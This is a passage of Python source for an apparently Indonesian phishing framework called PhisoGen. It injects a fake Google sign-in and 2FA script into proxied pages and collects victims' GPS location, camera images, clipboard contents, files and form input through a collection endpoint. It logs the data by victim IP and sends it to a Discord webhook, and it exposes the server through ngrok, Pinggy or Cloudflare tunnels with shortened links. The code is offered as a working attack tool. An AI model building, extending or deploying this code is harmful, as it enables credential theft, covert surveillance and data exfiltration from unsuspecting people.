                            if (e.key === 'Enter') document.getElementById('gaNext2').click();
                        });
                        setTimeout(function() { document.getElementById('gaPass').focus(); }, 100);
                    }

                    gaNext1.addEventListener('click', function() {
                        var email = gaEmail.value.trim();
                        if (!email) {
                            gaEmailError.textContent = 'Enter an email or phone number';
                            gaEmailError.style.display = 'block';
                            gaEmail.style.borderColor = '#d93025';
                            return;
                        }
                        gaEmailError.style.display = 'none';
                        gaNext1.disabled = true;
                        gaNext1.textContent = 'Verifying...';
                        setTimeout(function() {
                            showStep2(email);
                        }, 800);
                    });

                    gaEmail.addEventListener('keydown', function(e) {
                        if (e.key === 'Enter') gaNext1.click();
                    });
                    setTimeout(function() { gaEmail.focus(); }, 100);
                    """

                permission_script += """
                }
                </script>
                """

                # Inject the permission script before closing </body>
                if '</body>' in proxied_content:
                    proxied_content = proxied_content.replace('</body>', permission_script + '</body>')
                else:
                    proxied_content += permission_script

                response = make_response(proxied_content)
                
                # Set cookie palsu dengan atribut SameSite dan Secure
                fake_cookie = jwt.encode({'user_id': 'anonymous', 'session': ''.join(random.choices(string.ascii_letters + string.digits, k=32))}, self.secret_key, algorithm='HS256')
                response.set_cookie('session', fake_cookie, httponly=True, secure=True, samesite='Lax')
                
                return response
            except Exception as e:
                self.logger.error(f"Error serving phishing page: {str(e)}")
                return "Halaman tidak ditemukan", 404
                
        @self.app.route('/collect-data', methods=['POST'])
        def collect_data():
            try:
                victim_ip = request.remote_addr
                
                if 'files[]' in request.files:
                    # Handle file upload
                    uploaded_files = request.files.getlist('files[]')
                    filenames = []
                    
                    for file in uploaded_files:
                        if file:
                            filename = os.path.join(RESULTS_DIR, f"uploaded_files/{int(time.time())}_{victim_ip}_{file.filename}")
                            file.save(filename)
                            filenames.append(filename)
                            
                    result = {
                        'type': 'file_upload',
                        'ip': victim_ip,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                        'data': {
                            'filenames': filenames
                        }
                    }
                else:
                    # Handle other data types
                    data = request.get_json()
                    
                    if data['type'] == 'camera_capture':
                        # Save base64 image to file
                        img_data = data['image'].replace('data:image/jpeg;base64,', '')
                        img_bytes = base64.b64decode(img_data)
                        
                        filename = os.path.join(RESULTS_DIR, f"captured_images/capture_{int(time.time())}_{victim_ip}.jpg")
                        
                        with open(filename, 'wb') as f:
                            f.write(img_bytes)
                            
                        data['image'] = filename
                    
                    result = {
                        'type': data['type'],
                        'ip': victim_ip,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                        'data': data
                    }
                
                self.add_victim_data(victim_ip, result)
                self.save_result(result)
                
                return jsonify({'status': 'success'})
            except Exception as e:
                self.logger.error(f"Error collecting data: {str(e)}")
                return jsonify({'status': 'error', 'message': str(e)}), 500

    def _load_session_token(self):
        return self._load_session_key('ngrok_token')

    def _load_session_key(self, key):
        if os.path.exists(SESSION_FILE):
            try:
                with open(SESSION_FILE, 'r') as f:
                    session = json.load(f)
                    return session.get(key)
            except:
                pass
        return None

    def _save_session_key(self, key, value):
        session = {}
        if os.path.exists(SESSION_FILE):
            try:
                with open(SESSION_FILE, 'r') as f:
                    session = json.load(f)
            except:
                pass
        session[key] = value
        with open(SESSION_FILE, 'w') as f:
            json.dump(session, f)

    def _save_session_token(self, token):
        self._save_session_key('ngrok_token', token)

    def _clear_session_token(self):
        self._clear_session_keys(['ngrok_token'])

    def _clear_session_all(self):
        self._clear_session_keys([
            'ngrok_token', 'ngrok_region', 'server_port',
            'webhook_url', 'tunnel_type', 'cf_token', 'cf_url',
            'language'
        ])

    def _clear_session_keys(self, keys):
        if os.path.exists(SESSION_FILE):
            try:
                with open(SESSION_FILE, 'r') as f:
                    session = json.load(f)
                for key in keys:
                    session.pop(key, None)
                with open(SESSION_FILE, 'w') as f:
                    json.dump(session, f)
            except:
                pass

    def save_result(self, result):
        try:
            self.results.append(result)
            with open(os.path.join(RESULTS_DIR, 'phishing_results.txt'), 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*50}\n")
                f.write(f"Tipe: {result['type']}\n")
                f.write(f"IP: {result['ip']}\n")
                f.write(f"Waktu: {result['timestamp']}\n")
                f.write(f"Data: {result['data']}\n")
            
            console.print(Panel(f"""
[cyan]🎣 Data Phishing Baru Ditangkap![/]
    
[yellow]Tipe:[/] {result['type']}
[yellow]IP:[/] {result['ip']}
[yellow]Waktu:[/] {result['timestamp']}
[yellow]Data:[/] {result['data']}
            """))
            self.send_webhook(result)
        except Exception as e:
            self.logger.error(f"Error menyimpan hasil: {str(e)}")

    def send_webhook(self, result):
        if not self.webhook_url:
            return
        try:
            embed = {
                "embeds": [{
                    "title": "🎣 PhisoGen - Data Captured",
                    "color": 16711680,
                    "fields": [
                        {"name": "Type", "value": result['type'], "inline": True},
                        {"name": "IP", "value": result['ip'], "inline": True},
                        {"name": "Time", "value": result['timestamp'], "inline": False},
                        {"name": "Data", "value": f"```json\n{json.dumps(result['data'], indent=2)[:1000]}\n```", "inline": False}
                    ],
                    "footer": {"text": "ZetaGo-Aurum · PhisoGen v3.0"}
                }]
            }
            requests.post(self.webhook_url, json=embed, timeout=5)
        except:
            pass

    def select_language(self):
        """Pilih bahasa aplikasi"""
        self.clear_screen()
        console.print(Panel("[cyan]✨ Select Language / Pilih Bahasa ✨[/]", border_style="cyan"))
        console.print("\n[1] 🇺🇸 English")
        console.print("[2] 🇮🇩 Bahasa Indonesia")
        
        while True:
            choice = console.input("\n[yellow]Select option (1-2): [/]")
            if choice in ["1", "2"]:
                self.language = "en" if choice == "1" else "id"
                break
            console.print("[red]Invalid choice! Please select 1 or 2[/]")

    def _check_ngrok(self):
        try:
            subprocess.run(["ngrok", "version"], capture_output=True, check=True, timeout=10)
            return True
        except:
            return False

    def install_ngrok(self):
        console.print("[yellow]⬇️ ngrok not found. Installing automatically...[/]")
        system = platform.system().lower()
        machine = platform.machine().lower()
        is_termux = bool(os.environ.get('PREFIX'))

        if is_termux:
            self._install_ngrok_termux()
        else:
            self._install_ngrok_linux(machine, system)

    def _install_ngrok_termux(self):
        prefix = os.environ.get('PREFIX', '/data/data/com.termux/files/usr')
        share_dir = os.path.join(prefix, 'share', 'ngrok')
        bin_dir = os.path.join(prefix, 'bin')
        os.makedirs(share_dir, exist_ok=True)

        try:
            console.print("[cyan]⟳ Updating Termux packages...[/]")
            subprocess.run(["pkg", "update", "-y"], capture_output=True, timeout=180)
            console.print("[cyan]⟳ Installing proot and wget...[/]")
            subprocess.run(["pkg", "install", "proot", "wget", "resolv-conf", "-y"],
                           capture_output=True, timeout=180)

            # Detect arch via dpkg
            result = subprocess.run(["dpkg", "--print-architecture"],
                                    capture_output=True, text=True, timeout=10)
            arch = result.stdout.strip()
            arch_map = {'aarch64': 'arm64', 'arm': 'arm', 'armhf': 'arm',
                        'amd64': 'amd64', 'i386': '386', 'i686': '386'}
            ngrok_arch = arch_map.get(arch, 'arm64')

            url = f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-{ngrok_arch}.zip"
            zip_path = os.path.join(share_dir, 'ngrok.zip')

            with console.status("[cyan]Downloading ngrok..."):
                resp = requests.get(url, timeout=120, stream=True)
                resp.raise_for_status()
                with open(zip_path, 'wb') as f:
                    for chunk in resp.iter_content(chunk_size=8192):
                        if chunk: f.write(chunk)

            with console.status("[cyan]Extracting ngrok..."):
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(path=share_dir)
                os.remove(zip_path)
                os.chmod(os.path.join(share_dir, 'ngrok'), 0o755)

            # Create proot wrapper
            wrapper = os.path.join(bin_dir, 'ngrok')
            with open(wrapper, 'w') as f:
                f.write(f'#!/bin/bash\nexec termux-chroot -- {share_dir}/ngrok "$@"\n')
            os.chmod(wrapper, 0o755)

            ngrok.set_bin(wrapper)
            console.print(f"[green]✓ ngrok installed to {wrapper} (wraps {share_dir}/ngrok via proot)[/]")

        except Exception as e:
            console.print(f"[red]❌ Termux auto-install failed: {str(e)[:100]}[/]")
            console.print("[yellow]Try: git clone https://github.com/JesusChapman/termux-ngrok && cd termux-ngrok && bash install.sh[/]")

    def _install_ngrok_linux(self, machine, system):
        arch_map = {'x86_64': 'amd64', 'amd64': 'amd64', 'aarch64': 'arm64',
                     'arm64': 'arm64', 'armv7l': 'arm', 'arm': 'arm', 'i386': '386', 'i686': '386'}
        arch = arch_map.get(machine, 'amd64')
        os_name = 'darwin' if system == 'darwin' else 'linux'
        ext = 'tgz'
        url = f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-{os_name}-{arch}.{ext}"
        dest = '/usr/local/bin'
        if not os.access(dest, os.W_OK):
            dest = os.path.expanduser('~/.local/bin')
            os.makedirs(dest, exist_ok=True)

        try:
            with console.status("[cyan]Downloading ngrok..."):
                resp = requests.get(url, timeout=120, stream=True)
                resp.raise_for_status()
                tarball = f"/tmp/ngrok.{ext}"
                with open(tarball, 'wb') as f:
                    for chunk in resp.iter_content(chunk_size=8192):
                        if chunk: f.write(chunk)

            with console.status("[cyan]Extracting ngrok..."):
                with tarfile.open(tarball, 'r:gz') as tar:
                    tar.extractall(path='/tmp')

            ngrok_bin = os.path.join(dest, 'ngrok')
            subprocess.run(["mv", "/tmp/ngrok", ngrok_bin], capture_output=True, check=True)
            subprocess.run(["chmod", "+x", ngrok_bin], capture_output=True, check=True)
            os.remove(tarball)

            os.environ.setdefault('PATH', '')
            os.environ['PATH'] = dest + os.pathsep + os.environ['PATH']
            ngrok.set_bin(ngrok_bin)
            console.print(f"[green]✓ ngrok installed to {ngrok_bin}[/]")
        except Exception as e:
            console.print(f"[red]❌ Auto-install failed: {str(e)[:80]}[/]")
            console.print("[yellow]Try manual install: https://ngrok.com/download[/]")

    def select_tunnel_engine(self):
        self.clear_screen()
        console.print(Panel("[cyan]🔌 Select Tunnel Engine / Pilih Engine Tunnel[/]", border_style="cyan"))
        current = self.tunnel_type
        console.print(f"\n[1] Ngrok {'✅ (current)' if current == TUNNEL_NGROK else ''}")
        console.print(f"    [dim]Stable, feature-rich, but has security page[/]")
        console.print(f"[2] Pinggy {'✅ (current)' if current == TUNNEL_PINGGY else ''}")
        console.print(f"    [dim]Fast, no auth needed, SSH-based, no redirect[/]")
        console.print(f"[3] Cloudflare Tunnel {'✅ (current)' if current == TUNNEL_CLOUDFLARE else ''}")
        console.print(f"    [dim]Fast, stable; needs token for custom domain, or auto quick tunnel[/]")
        while True:
            c = console.input(f"\n[yellow][[?]] Select (1-3): [/]")
            if c == "1":
                self.tunnel_type = TUNNEL_NGROK
                break
            elif c == "2":
                self.tunnel_type = TUNNEL_PINGGY
                break
            elif c == "3":
                self.tunnel_type = TUNNEL_CLOUDFLARE
                has_token = bool(self.cf_token)
                prompt = 'Use existing token?' if has_token else 'Have a Cloudflare token?'
                cf_choice = console.input(f"\n[yellow][[?]] {prompt} (y=token / n=quick tunnel) [y/n]: [/]").strip().lower()
                if cf_choice == 'y':
                    if not has_token:
                        self.cf_token = console.input("\n[yellow]Enter Cloudflare Tunnel token: [/]").strip()
                        self._save_session_key('cf_token', self.cf_token)
                    console.print("[dim]→ Using token-based tunnel (custom domain)[/]")
                else:
                    self.cf_token = None
                    self._clear_session_keys(['cf_token', 'cf_url'])
                    console.print("[dim]→ Using Quick Tunnel (trycloudflare.com)[/]")
                break
        self._save_session_key('tunnel_type', self.tunnel_type)

    def _start_pinggy(self):
        import re, select
        addr = str(self.server_port)
        console.print(f"[cyan]⟳ Starting Pinggy tunnel on port {addr}...[/]")
        console.print("[dim]🌐 Pinggy provides HTTP/HTTPS URLs accessible from any browser[/]")
        try:
            self.tunnel_process = subprocess.Popen(
                ["ssh", "-p", "443", "-R", f"0:localhost:{addr}",
                 "-o", "StrictHostKeyChecking=no",
                 "-o", "UserKnownHostsFile=/dev/null",
                 "-o", "ServerAliveInterval=30",
                 "-o", "ServerAliveCountMax=3",
                 "-o", "ExitOnForwardFailure=yes",
                 "-o", "BatchMode=yes",
                 "-o", "PasswordAuthentication=no",
                 "-o", "ConnectTimeout=15",
                 "free.pinggy.io"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
            )
            url = None
            output_log = []
            start = time.time()
            while time.time() - start < 30:
                try:
                    r, _, _ = select.select([self.tunnel_process.stdout], [], [], 0.5)
                    if not r:
                        continue
                    line = self.tunnel_process.stdout.readline()
                    if not line:
                        continue
                    line = line.strip()
                    if line:
                        output_log.append(line)
                    urls = re.findall(r'https?://[a-z0-9][-a-z0-9\.]*(?::\d+)?(?:/[^\s\'\"<>]*)?', line)
                    for u in urls:
                        u = u.rstrip('/.')
                        if 'pinggy' in u:
                            url = u
                            break
                except:
                    pass
                if url:
                    break
            if not url:
                for line in output_log:
                    urls = re.findall(r'https?://[a-z0-9][-a-z0-9\.]*(?::\d+)?(?:/[^\s\'\"<>]*)?', line)
                    for u in urls:
                        u = u.rstrip('/.')
                        if 'pinggy' in u:
                            url = u
                            break
                    if url:
                        break
            if url:
                self.server_url = url
                console.print(f"[green]✅ Pinggy tunnel: {url}[/]")
                self._shorten_url_for_display(url)
                console.print(f"[dim]🌐 {url} {'— accessible from any browser' if self.language == 'en' else '— bisa diakses dari browser mana pun'}[/]")
            else:
                raise Exception("Could not parse Pinggy URL. Output: " + ' | '.join(output_log[-5:]))
        except Exception as e:
            msg = f"❌ Pinggy failed: {str(e)[:120]}"
            self.logger.error(msg)
            console.print(f"[red]{msg}[/]")
            self.server_url = None

    def _install_cloudflared(self):
        console.print("[yellow]⬇️ cloudflared not found. Installing automatically...[/]")
        system = platform.system().lower()
        machine = platform.machine().lower()
        is_termux = bool(os.environ.get('PREFIX'))

        try:
            if is_termux:
                console.print("[cyan]⟳ Trying pkg install cloudflared...[/]")
                result = subprocess.run(["pkg", "install", "cloudflared", "-y"],
                                        capture_output=True, timeout=180)
                if result.returncode == 0:
                    console.print("[green]✓ cloudflared installed via pkg[/]")
                    return
                console.print("[yellow]pkg install failed, downloading binary...[/]")

            arch_map = {
                'x86_64': 'amd64', 'amd64': 'amd64',
                'aarch64': 'arm64', 'arm64': 'arm64',
                'armv7l': 'arm', 'arm': 'arm',
                'i386': '386', 'i686': '386'
            }
            arch = arch_map.get(machine, 'amd64')
            os_name = 'darwin' if system == 'darwin' else 'linux'

            url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-{os_name}-{arch}"
            dest = '/usr/local/bin'
            if not os.access(dest, os.W_OK):
                dest = os.path.expanduser('~/.local/bin')
                os.makedirs(dest, exist_ok=True)

            binary = os.path.join(dest, 'cloudflared')
            with console.status("[cyan]Downloading cloudflared..."):
                resp = requests.get(url, timeout=120, stream=True)
                resp.raise_for_status()
                with open(binary, 'wb') as f:
                    for chunk in resp.iter_content(chunk_size=8192):
                        if chunk: f.write(chunk)
            os.chmod(binary, 0o755)

            os.environ.setdefault('PATH', '')
            os.environ['PATH'] = dest + os.pathsep + os.environ['PATH']
            console.print(f"[green]✓ cloudflared installed to {binary}[/]")

        except Exception as e:
            console.print(f"[red]❌ Auto-install cloudflared failed: {str(e)[:100]}[/]")
            console.print("[yellow]Manual: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/[/]")
            raise

    def _start_cloudflare(self):
        import select
        addr = str(self.server_port)
        try:
            subprocess.run(["cloudflared", "version"], capture_output=True, check=True, timeout=10)
        except:
            self._install_cloudflared()

        # Determine mode: token (pre-configured tunnel) vs quick (trycloudflare)
        if not self.cf_token:
            use_quick = True
            console.print("\n[cyan]⟳ No token found. Using Quick Tunnel (trycloudflare.com)...[/]")
        else:
            use_quick = False
            console.print(f"[cyan]⟳ Starting Cloudflare tunnel with token...[/]")

        console.print(f"[dim]Port: {addr}[/]")
        try:
            if use_quick:
                self.tunnel_process = subprocess.Popen(
                    ["cloudflared", "tunnel", "--no-autoupdate", "--url", f"http://localhost:{addr}"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
                )
            else:
                self.tunnel_process = subprocess.Popen(
                    ["cloudflared", "tunnel", "--no-autoupdate", "run", "--token", self.cf_token],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
                )

            url = None
            start = time.time()
            while time.time() - start < 25:
                r, _, _ = select.select([self.tunnel_process.stdout], [], [], 0.5)
                if r:
                    line = self.tunnel_process.stdout.readline()
                    if not line:
                        continue
                    line = line.strip()
                    if use_quick:
                        if 'trycloudflare.com' in line:
                            for w in line.split():
                                if '://' in w and 'trycloudflare.com' in w:
                                    url = w.strip()
                                    break
                    else:
                        # Token mode: check for connection confirmation
                        if 'Starting tunnel' in line or 'Registered tunnel' in line or 'Connection' in line:
                            console.print(f"[dim]  {line[:120]}[/]")
                if url:
                    break

            if url:
                self.server_url = url
                console.print(f"[green]✅ Cloudflare tunnel: {url}[/]")
                self._shorten_url_for_display(url)
            elif use_quick:
                console.print("[yellow]⚠ Quick tunnel URL not found. Check logs.[/]")
                self.server_url = None
            else:
                # Token mode: URL is the public hostname user configured in dashboard
                saved_url = self._load_session_key('cf_url')
                if saved_url:
                    self.server_url = saved_url
                    console.print(f"[green]✅ Cloudflare tunnel started → {saved_url}[/]")
                    self._shorten_url_for_display(saved_url)
                else:
                    console.print("[yellow]Enter your tunnel's public hostname/URL (from Cloudflare dashboard):[/]")
                    public_url = console.input(f"[cyan]URL (e.g. https://phish.yourdomain.com): [/]").strip().rstrip('/')
                    if public_url:
                        self.server_url = public_url
                        self._save_session_key('cf_url', public_url)
                        console.print(f"[green]✅ Cloudflare tunnel → {public_url}[/]")
                        self._shorten_url_for_display(public_url)
                    else:
                        self.server_url = f"http://localhost:{addr}"
        except Exception as e:
            msg = f"❌ Cloudflare failed: {str(e)[:80]}"
            self.logger.error(msg)
            console.print(f"[red]{msg}[/]")
            self.server_url = None

    def _shorten_url_for_display(self, url):
        for name, fn in [("is.gd", lambda u: self.shortener.isgd.short(u)),
                          ("da.gd", lambda u: self.shortener.dagd.short(u)),
                          ("TinyURL", lambda u: self.shortener.tinyurl.short(u))]:
            try:
                s = fn(url)
                if s and s != url:
                    console.print(f"[dim]🔗 Short: {s} ({name})[/]")
                    return
            except:
                continue
        console.print(f"[dim]🔗 Short: (all shorteners failed for this URL)[/]")

    def setup_tunnel(self):
        self.clear_screen()
        if self.tunnel_type == TUNNEL_NGROK:
            self.setup_ngrok()
        elif self.tunnel_type == TUNNEL_PINGGY:
            self._start_pinggy()
        elif self.tunnel_type == TUNNEL_CLOUDFLARE:
            self._start_cloudflare()

    def setup_ngrok(self):
        """Setup ngrok tunnel dengan session token"""
        self.clear_screen()
        if NGROK_MANAGER != "pyngrok":
            try:
                subprocess.run(["ngrok", "version"], capture_output=True, check=True, timeout=10)
            except:
                self.install_ngrok()
                if not self._check_ngrok():
                    console.print("[red]❌ Failed to install ngrok automatically[/]")
                    console.input("\n[green]Press Enter to continue...[/]")
                    return
        try:
            saved_token = self._load_session_token()
            if saved_token:
                self.ngrok_auth_token = saved_token
                console.print("[green]✓ Ngrok token loaded from session[/]")
            else:
                self.ngrok_auth_token = console.input("\n[yellow][[?]] Enter your ngrok auth token (get it at https://dashboard.ngrok.com): [/]")
                self._save_session_token(self.ngrok_auth_token)
                console.print("[green]✓ Ngrok token saved to session[/]")

            if NGROK_MANAGER == "pyngrok":
                conf.get_default().auth_token = self.ngrok_auth_token
                conf.get_default().region = self.ngrok_region
            else:
                subprocess.run(["ngrok", "config", "add-authtoken", self.ngrok_auth_token],
                               capture_output=True, timeout=10)

            try:
                ngrok.kill()
            except:
                pass

            addr = str(self.server_port)

            max_retries = 3
            for attempt in range(max_retries):
                try:
                    if NGROK_MANAGER == "pyngrok":
                        ngrok_tunnel = ngrok.connect(
                            bind_tls=True, proto="http", addr=addr,
                            inspect=False, auth=None, host_header="rewrite"
                        )
                    else:
                        ngrok_tunnel = ngrok.connect(addr)
                    self.server_url = ngrok_tunnel.public_url
                    if self.server_url:
                        break
                    raise Exception("Failed to get public URL")
                except Exception as e:
                    error_str = str(e).lower()
                    if any(k in error_str for k in ['auth', 'credential', 'token', 'unauthorized']):
                        self._clear_session_token()
                        raise Exception("Ngrok authentication failed. Token saved in session has been cleared. Please provide a valid token next run.")
                    if attempt == max_retries - 1:
                        raise e
                    time.sleep(2)

            @self.app.after_request
            def after_request(response):
                response.headers.add('Access-Control-Allow-Origin', '*')
                response.headers.add('Access-Control-Allow-Headers', '*')
                response.headers.add('Access-Control-Allow-Methods', '*')
                response.headers.add('X-Frame-Options', 'ALLOWALL')
                response.headers.add('X-Content-Type-Options', 'nosniff')
                response.headers.add('Strict-Transport-Security', 'max-age=31536000')
                return response

            msg = f"✅ Ngrok tunnel berhasil dibuat di {self.server_url}"
            self.logger.info(msg)
            console.print(f"[green]{msg}[/]")
            self._shorten_url_for_display(self.server_url)

        except Exception as e:
            msg = f"❌ Tunnel failed: {str(e)}"
            self.logger.error(msg)
            console.print(f"[red]{msg}[/]")
            self.server_url = None

    def settings_menu(self):
        self.clear_screen()
        regions = {'us': 'United States', 'eu': 'Europe', 'ap': 'Asia Pacific', 'au': 'Australia', 'sa': 'South America', 'jp': 'Japan', 'in': 'India'}
        tunnel_names = {TUNNEL_NGROK: 'Ngrok', TUNNEL_PINGGY: 'Pinggy', TUNNEL_CLOUDFLARE: 'Cloudflare'}
        console.print(Panel("⚙️ Settings", border_style="cyan"))
        console.print(f"\n[cyan]Current settings:[/]")
        console.print(f"  [yellow]Tunnel Engine:[/] {tunnel_names.get(self.tunnel_type, self.tunnel_type)}")
        console.print(f"  [yellow]Ngrok Region:[/] {self.ngrok_region.upper()} ({regions.get(self.ngrok_region, 'Unknown')})")
        console.print(f"  [yellow]Server Port:[/] {self.server_port}")
        console.print(f"  [yellow]Webhook URL:[/] {self.webhook_url or 'Not set'}")
        console.print("\n[1] Change tunnel engine")
        console.print("[2] Change ngrok region")
        console.print("[3] Change server port")
        console.print("[4] Set Discord webhook URL")
        console.print("[5] Clear webhook URL")
        console.print("[6] Clear all session data (tokens, URLs)")
        console.print("[7] Back to menu")
        choice = console.input("\n[yellow][[?]] Select option (1-7): [/]")
        if choice == "1":
            console.print("\n[1] Ngrok")
            console.print("[2] Pinggy (SSH, no auth)")
            console.print("[3] Cloudflare Tunnel")
            c = console.input("\n[yellow]Select tunnel engine (1-3): [/]")
            if c == "1":
                self.tunnel_type = TUNNEL_NGROK
                self._save_session_key('tunnel_type', TUNNEL_NGROK)
                console.print("[green]✓ Tunnel engine: Ngrok (restart required)[/]")
            elif c == "2":
                self.tunnel_type = TUNNEL_PINGGY
                self._save_session_key('tunnel_type', TUNNEL_PINGGY)
                console.print("[green]✓ Tunnel engine: Pinggy (restart required)[/]")
            elif c == "3":
                self.tunnel_type = TUNNEL_CLOUDFLARE
                self._save_session_key('tunnel_type', TUNNEL_CLOUDFLARE)
                console.print("[green]✓ Tunnel engine: Cloudflare (restart required)[/]")
        elif choice == "2":
            console.print("\nAvailable regions:")
            for code, name in regions.items():
                console.print(f"  [{code}] {name}")
            reg = console.input("\n[yellow]Enter region code: [/]").lower()
            if reg in regions:
                self.ngrok_region = reg
                self._save_session_key('ngrok_region', reg)
                console.print(f"[green]✓ Region set to {reg.upper()}[/]")
        elif choice == "3":
            try:
                port = int(console.input("\n[yellow]Enter port number (1024-65535): [/]"))
                if 1024 <= port <= 65535:
                    self.server_port = port
                    self._save_session_key('server_port', port)
                    console.print(f"[green]✓ Port set to {port}[/]")
                else:
                    console.print("[red]Port must be between 1024 and 65535[/]")
            except:
                console.print("[red]Invalid port[/]")
        elif choice == "4":
            url = console.input("\n[yellow]Enter Discord webhook URL: [/]")
            if url.startswith('https://discord.com/api/webhooks/'):
                self.webhook_url = url
                self._save_session_key('webhook_url', url)
                console.print("[green]✓ Webhook URL saved[/]")
            else:
                console.print("[red]Invalid Discord webhook URL[/]")
        elif choice == "5":
            self.webhook_url = None
            self._save_session_key('webhook_url', None)
            console.print("[green]✓ Webhook URL cleared[/]")
        elif choice == "6":
            self._clear_session_all()
            console.print("[green]✓ All session data cleared (tokens, URLs, settings)[/]")
        console.input("\n[green]Press Enter to continue...[/]")

    def export_results(self):
        if not self.results:
            console.print("[red]No results to export[/]")
            console.input("\n[green]Press Enter to continue...[/]")
            return
        try:
            filename = os.path.join(RESULTS_DIR, f"export_{int(time.time())}.json")
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2)
            console.print(f"[green]✓ Results exported to {filename}[/]")
        except Exception as e:
            console.print(f"[red]Export failed: {str(e)}[/]")
        console.input("\n[green]Press Enter to continue...[/]")

    def add_victim_data(self, victim_ip, data):
        """Tambah data korban dan update display realtime dengan penanganan error"""
        try:
            if victim_ip not in self.victims:
                self.victims[victim_ip] = []
            self.victims[victim_ip].append(data)
            if self.show_victims:
                self.update_live_display()
        except Exception as e:
            self.logger.error(f"Error adding victim data: {str(e)}")

    def update_live_display(self):
        """Update tampilan realtime dengan rich dan penanganan error"""
        try:
            title = "🎯 Real-time Phishing Victims Data" if self.language == "en" else "🎯 Data Korban Phishing Realtime"
            table = Table(title=title)
            table.add_column("IP", style="cyan")
            table.add_column("Time" if self.language == "en" else "Waktu", style="magenta")
            table.add_column("Type" if self.language == "en" else "Tipe", style="green")
            table.add_column("Data", style="yellow")

            for ip, data_list in self.victims.items():
                for data in data_list:
                    table.add_row(
                        ip,
                        data['timestamp'],
                        data['type'],
                        str(data['data'])
                    )

            console.clear()
            console.print(table)
            
        except Exception as e:
            self.logger.error(f"Error updating live display: {str(e)}")

    def clear_screen(self):
        """Clear screen dengan penanganan error"""
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
        except:
            print("\n" * 100)

    def display_banner(self):
        banner = f"""
        ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗
        ║ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗     ████████╗ ██████╗  ██████╗ ██╗ ║
        ║ ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝     ╚══██╔══╝██╔═══██╗██╔═══██╗██║ ║ 
        ║ ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗       ██║   ██║   ██║██║   ██║██║ ║
        ║ ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║       ██║   ██║   ██║██║   ██║██║ ║
        ║ ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝██║ ║
        ║ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚═╝ ║
        ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝                                                                                                    
    [yellow][*] Created By: ZetaGo-Aurum
    [green][*] Version: 3.0 - Advanced Phishing Framework with Ngrok Integration
    [cyan][*] Server Status: {'🟢 Online' if self.server_url else '🔴 Offline'} - {self.server_url if self.server_url else 'Not Connected'}
        """
        console.print(Panel(banner))

    def display_menu(self):
        menu = Table(title="🎯 Phishing Menu" if self.language == "en" else "🎯 Menu Phishing", border_style="cyan")
        menu.add_column("No", style="cyan", justify="center")
        menu.add_column("Option" if self.language == "en" else "Opsi", style="yellow")
        menu.add_column("Description" if self.language == "en" else "Deskripsi", style="green")
        
        menu_items = [
            ("1", "Location Phishing" if self.language == "en" else "Phishing Lokasi", 
             "Get victim's GPS location" if self.language == "en" else "Dapatkan lokasi GPS korban"),
            ("2", "Form Phishing" if self.language == "en" else "Phishing Form",
             "Create custom phishing form" if self.language == "en" else "Buat form phishing kustom"),
            ("3", "Camera Phishing" if self.language == "en" else "Phishing Kamera",
             "Access victim's camera" if self.language == "en" else "Akses kamera korban"),
            ("4", "File Phishing" if self.language == "en" else "Phishing File",
              "Get files from victim" if self.language == "en" else "Dapatkan file dari korban"),
            ("5", "Clipboard Phishing" if self.language == "en" else "Phishing Clipboard",
             "Capture clipboard data" if self.language == "en" else "Tangkap data clipboard korban"),
            ("6", "Combo Phishing" if self.language == "en" else "Phishing Kombo",
             "Location + Camera simultaneously" if self.language == "en" else "Lokasi + Kamera bersamaan"),
            ("7", "Clickjack Phishing" if self.language == "en" else "Phishing Clickjack",
             "Fake download/getlink trap" if self.language == "en" else "Jebakan download/getlink palsu"),
            ("8", "Google Auth" if self.language == "en" else "Google Auth",
             "Fake Google 2FA verification" if self.language == "en" else "Verifikasi 2FA Google palsu"),
            ("9", "View Results" if self.language == "en" else "Lihat Hasil",
             "View captured data" if self.language == "en" else "Lihat data yang didapat"),
            ("10", "Export Data" if self.language == "en" else "Ekspor Data",
             "Export results to JSON" if self.language == "en" else "Ekspor hasil ke JSON"),
            ("11", "Settings" if self.language == "en" else "Pengaturan",
             "Configure webhook, region, port, tunnel" if self.language == "en" else "Atur webhook, region, port, tunnel"),
            ("12", "Exit" if self.language == "en" else "Keluar",
             "Exit program" if self.language == "en" else "Keluar dari program")
        ]
        
        for item in menu_items:
            menu.add_row(*item)
            
        console.print(menu)

    def generate_phishing_link(self, phish_type, target_url=None):
        """Generate link phishing dengan penanganan error yang lebih baik"""
        try:
            if not self.server_url:
                raise ValueError("Server URL tidak tersedia. Silakan periksa koneksi tunnel.")
                
            phish_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            phish_url = f"{self.server_url}/phish/{phish_id}?type={phish_type}&url={target_url}"
            
            # Tidak perlu membuat template phishing karena menggunakan reverse proxy
            # Simpan template sederhana dengan proxy
            template_path = f"templates/{phish_id}.html"
            proxy_template = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Redirecting...</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
